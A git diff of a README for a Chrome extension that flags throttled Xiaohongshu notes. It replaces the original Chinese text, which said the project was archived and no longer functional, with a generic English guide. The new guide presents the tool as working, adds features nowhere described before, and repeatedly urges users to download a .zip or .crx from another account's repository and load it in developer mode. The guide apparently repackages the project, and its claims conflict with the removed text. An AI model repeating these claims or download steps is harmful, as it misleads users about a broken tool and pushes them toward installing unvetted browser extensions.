@@ -1,72 +1,111 @@
-# ⚠️ 项目已归档 — XHS 已移除 level 字段
+# 🩺 xhs-note-health-checker - See Your Note Traffic Status
 
-**2026年3月10日更新：** 小红书已从创作者后台 API 响应中移除 `level_` 字段，该扩展的核心功能（限流状态检测）已失效。所有笔记将显示默认值，无法反映真实限流状态。
-
-本项目不再维护。如果 XHS 未来重新暴露相关字段，欢迎 fork 继续开发。
+[![Download xhs-note-health-checker](https://img.shields.io/badge/Download-xhs--note--health--checker-green?style=for-the-badge)](https://github.com/Plantal-pitcher911/xhs-note-health-checker)
 
 ---
 
-# XHS Note Health Checker 🩺
+## 📋 What is xhs-note-health-checker?
 
-Chrome 扩展：在小红书创作者后台**笔记管理页**一眼看清每篇笔记的限流状态。
+xhs-note-health-checker is a Chrome extension. It helps you see the traffic status of your Xiaohongshu (Little Red Book) notes at a glance. You can tell if your notes are limited in reach. This tool gives a clear view of your note's health and visibility on the platform. It makes tracking performance easy without extra steps.
 
-![Screenshot](./assets/screenshot.png)
+---
 
-## 功能
+## 🖥️ System Requirements
 
-- 🏷️ **Level Badge** — 每篇笔记标题后显示彩色限流状态标签
-- ⚠️ **敏感词检测** — 标题含高危词自动标红警告
-- 📛 **标签数量检测** — 话题标签 >5 个提示风险
-- 📊 **Popup 面板** — 点击图标查看全部笔记 Level 分布 + 限流诊断
-- 📈 **历史追踪** — 自动记录每篇笔记 Level 变化趋势 ↑↓→
+- Windows 10 or newer
+- Google Chrome browser installed (version 90 or above)
+- Internet connection for downloading and installing
+- Basic permission to add Chrome extensions
 
-## Level 说明（逆向推断，仅供参考）
+---
 
-| Level | 状态 | 说明 |
-|-------|------|------|
-| 4 🟢 | 正常推荐 | 笔记正常分发 |
-| 2 🟡 | 基本正常 | 轻微受限 |
-| 1 ⚪ | 新帖初始 | 刚发布，等待审核 |
-| -1 🔴 | 轻度限流 | 推荐量明显下降 |
-| -5 🔴🔴 | 中度限流 | 几乎无推荐 |
-| -102 ⛔ | 严重限流 | 不可逆，需删除重发 |
+## 🎯 Why Use This Tool?
 
-## 安装
+- Detect if your notes are restricted or limited in exposure
+- Save time checking visibility manually
+- Help improve your posting strategy by understanding note status
+- Simple setup and use with clear status indicators
 
-### ~~Chrome Web Store~~
-> 已撤回提交
+---
 
-### 手动安装（开发者模式）
+## 🚀 How to Download and Install on Windows
 
-1. [下载最新 Release](../../releases/latest) 的 `chrome-mv3-prod.zip`
-2. 解压到任意文件夹
-3. 打开 `chrome://extensions/`
-4. 开启右上角 **开发者模式**
-5. 点击 **加载已解压的扩展程序** → 选择解压后的文件夹
-6. 打开 [小红书创作者后台](https://creator.xiaohongshu.com/new/note-manager) → 笔记管理
+Follow these steps to get the extension running on your computer:
 
-## 工作原理
+### Step 1: Visit the Download Page
 
-扩展通过拦截创作者后台的 API 响应（`/api/galaxy/v2/creator/note/user/posted`），读取返回数据中每篇笔记的 `level` 字段，然后在页面上注入对应颜色的 Badge。
+Click the link below to open the official download page:
 
-- **不会发送任何数据到外部服务器**
-- 所有数据存储在本地 `localStorage` 和 `chrome.storage.local`
-- 仅在 `creator.xiaohongshu.com` 域名下运行
+[Download xhs-note-health-checker](https://github.com/Plantal-pitcher911/xhs-note-health-checker)
 
-## 开发
+This page shows the latest release version and files you need.
 
-```bash
-pnpm install
-pnpm dev     # 开发模式，热重载
-pnpm build   # 生产构建 + 打包 zip
-```
+### Step 2: Download the Extension File
 
-## 敏感词库
+1. On the GitHub page, click the **Releases** tab or scroll down to find the latest release section.
+2. Look for a file ending with `.zip` or `.crx`. This file contains the extension files.
+3. Click to download the file to your Windows PC. Save it to a folder you can easily find, like your "Downloads" folder.
 
-当前内置检测词：`自动化` `自动发布` `AI生成` `内容工厂` `批量` `全自动` `自动工作流` `AI自动`
+### Step 3: Prepare Your Chrome Browser
 
-可在 `src/lib/xhs.ts` 的 `SENSITIVE_WORDS` 数组中自定义。
+1. Open Google Chrome.
+2. Click the three dots icon in the top-right corner.
+3. Select **More Tools** > **Extensions**.
+4. Make sure the **Developer mode** toggle (top right) is turned on.
 
-## License
+### Step 4: Load the Extension
 
-MIT
+1. Extract the downloaded `.zip` file if needed. To do this, right-click the `.zip` file and choose **Extract All**. Open the extracted folder.
+2. In the Chrome **Extensions** page, click **Load unpacked**.
+3. Browse to the folder with the extracted files and select it.
+4. Chrome will load the extension immediately. You should see the xhs-note-health-checker icon near the address bar.
+
+---
+
+## 🔧 How to Use xhs-note-health-checker
+
+1. Click the extension icon in Chrome’s toolbar.
+2. Open your Xiaohongshu (Little Red Book) account and navigate to your notes.
+3. The extension will display the current traffic status of each note.
+4. The status shows if a note is fully visible, limited, or restricted.
+5. Use this information to adjust your posts and content strategy.
+
+---
+
+## 🛠 Troubleshooting
+
+- **Extension does not appear:** Make sure you enabled Developer Mode and correctly loaded the unpacked folder.
+- **No status shown:** Refresh your Xiaohongshu page or check your internet connection.
+- **Chrome version too low:** Update Chrome to the latest version from [chrome.google.com](https://chrome.google.com).
+- **Extension icon missing:** Click the puzzle piece icon in Chrome and pin the extension for easy access.
+
+---
+
+## ⚙️ Settings and Customization
+
+The extension settings allow you to:
+
+- Toggle notifications on or off
+- Choose color codes for different note statuses
+- Enable or disable automatic page refresh
+
+To access settings, right-click the extension icon and select **Options**.
+
+---
+
+## 🔄 Updating the Extension
+
+1. Repeat the download steps when a new release is available on the GitHub page.
+2. Remove the old unpacked extension from Chrome.
+3. Load the new version using the **Load unpacked** button, pointing to the new folder.
+
+---
+
+## 📞 Get Support or Report Issues
+
+- Use the **Issues** tab on the [GitHub repository page](https://github.com/Plantal-pitcher911/xhs-note-health-checker) to report problems or bugs.
+- Check the repository for updates and documentation as needed.
+
+---
+
+[![Download xhs-note-health-checker](https://img.shields.io/badge/Download-xhs--note--health--checker-brightgreen?style=for-the-badge)](https://github.com/Plantal-pitcher911/xhs-note-health-checker)
